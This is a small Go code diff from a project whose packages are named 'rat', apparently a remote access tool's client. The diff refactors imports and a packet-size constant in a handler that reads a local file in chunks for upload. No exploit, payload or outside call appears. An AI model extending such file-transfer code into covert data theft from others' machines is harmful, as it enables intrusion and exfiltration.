@@ -4,8 +4,8 @@ import (
 	"fmt"
 	"io"
 	"os"
-	"rat/shared"
-	"rat/shared/network/header"
+
+	"rat/client/network/header"
 )
 
 type UploadPacket struct {
@@ -40,7 +40,7 @@ func (packet UploadPacket) OnReceive() error {
 		}
 
 		for !final {
-			data := make([]byte, shared.TransferPacketSize)
+			data := make([]byte, TransferPacketSize)
 
 			read, err := local.Read(data)
 			if err == io.EOF {
